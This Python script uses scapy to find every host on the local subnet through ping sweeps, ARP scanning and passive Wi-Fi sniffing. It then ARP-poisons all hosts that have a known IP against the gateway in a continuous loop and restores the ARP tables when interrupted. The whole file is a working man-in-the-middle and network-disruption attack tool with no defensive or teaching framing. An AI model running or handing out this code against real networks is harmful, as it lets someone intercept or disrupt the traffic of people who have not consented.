from scapy.all import ARP, Ether, srp, sendp, sniff, Dot11
import threading
import subprocess
import time
import sys
import os

from autodetect_network import get_gateway_ip, get_network_interface

# === Globals ===
gateway_ip = get_gateway_ip()
interface = get_network_interface()
passive_devices = set()

print(f"[*] Gateway IP: {gateway_ip}")
print(f"[*] Using interface: {interface}")

# === Passive Detector ===
def passive_detect(pkt):
    """Detect devices passively by sniffing packets."""
    if pkt.haslayer(Dot11):
        mac = pkt.addr2  # MAC address of the device
        if mac:
            passive_devices.add(mac)

def start_passive_sniff():
    """Start sniffing for passive detection in the background."""
    print("[*] Starting passive device detection in background...")
    sniff(iface=interface, prn=passive_detect, store=0, timeout=15)  # Promiscuous mode


# === Active Scanner ===
def get_mac(ip):
    """Get the MAC address for an IP on the network."""
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    answered_list = srp(broadcast / arp_request, timeout=3, iface=interface, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None

def ping(ip):
    """Ping an IP to wake up devices."""
    try:
        subprocess.run(["ping", "-n", "1", "-w", "1000", ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)  # Windows-style ping
    except Exception:
        pass

def wake_up_devices(prefix):
    """Wake up devices on the subnet by pinging them."""
    print(f"[*] Waking up devices on {prefix}.0/24...")
    threads = []
    for i in range(1, 255):
        ip = f"{prefix}.{i}"
        t = threading.Thread(target=ping, args=(ip,))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

def scan_network(prefix):
    """Scan the network for active devices using ARP."""
    wake_up_devices(prefix)

    print(f"[*] Scanning {prefix}.0/24 network (active scan)...")
    arp_request = ARP(pdst=prefix + ".0/24")
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    answered = srp(broadcast / arp_request, timeout=5, iface=interface, verbose=False)[0]
    
    targets = []
    for sent, received in answered:
        if received.psrc != gateway_ip:
            targets.append({'ip': received.psrc, 'mac': received.hwsrc})
    
    return targets

# === ARP Spoofing ===
def spoof(target_ip, target_mac, spoof_ip):
    """Send a spoofed ARP reply to a target."""
    arp_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    ether = Ether(dst=target_mac)
    packet = ether / arp_packet
    sendp(packet, iface=interface, verbose=False)

def restore(destination_ip, destination_mac, source_ip, source_mac):
    """Restore the correct ARP tables."""
    arp_packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    ether = Ether(dst=destination_mac)
    packet = ether / arp_packet
    sendp(packet, count=5, iface=interface, verbose=False)

def start_spoofing_all(devices):
    """Start ARP poisoning all found devices."""
    gateway_mac = get_mac(gateway_ip)
    if gateway_mac is None:
        print("[!] Could not find gateway MAC address. Exiting...")
        return

    print("[*] Starting ARP poisoning... (Press CTRL+C to stop)")
    try:
        while True:
            for device in devices:
                spoof(device['ip'], device['mac'], gateway_ip)
                spoof(gateway_ip, gateway_mac, device['ip'])
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Detected CTRL+C! Restoring network...")
        for device in devices:
            restore(device['ip'], device['mac'], gateway_ip, gateway_mac)
            restore(gateway_ip, gateway_mac, device['ip'], device['mac'])
        print("[+] Network restored successfully.")

# === Main Flow ===
def main():
    """Main function to run active scan and passive sniffing in parallel."""
    prefix = gateway_ip.rsplit('.', 1)[0]

    # Start passive sniffing in background
    passive_thread = threading.Thread(target=start_passive_sniff)
    passive_thread.start()

    # Active scanning while passive is running
    active_devices = scan_network(prefix)

    passive_thread.join()  # Wait for passive sniff to finish

    print(f"[+] Passive detection found {len(passive_devices)} unique MAC addresses.")

    # Merge active and passive devices
    combined_devices = []
    known_macs = set()

    # First add active devices with IPs
    for device in active_devices:
        combined_devices.append(device)
        known_macs.add(device['mac'])

    # Then add passive-only devices (without IPs)
    for mac in passive_devices:
        if mac not in known_macs:
            combined_devices.append({'ip': 'Unknown', 'mac': mac})

    if combined_devices:
        print(f"[+] Total devices found: {len(combined_devices)}")
        for device in combined_devices:
            print(f"    IP: {device['ip']} | MAC: {device['mac']}")
        # Optional: Filter devices with known IPs only if you want spoofing
        spoofable_devices = [d for d in combined_devices if d['ip'] != 'Unknown']
        if spoofable_devices:
            start_spoofing_all(spoofable_devices)
        else:
            print("[!] No IP-known devices to spoof. Exiting.")
    else:
        print("[!] No devices found. Exiting...")

if __name__ == "__main__":
    main()
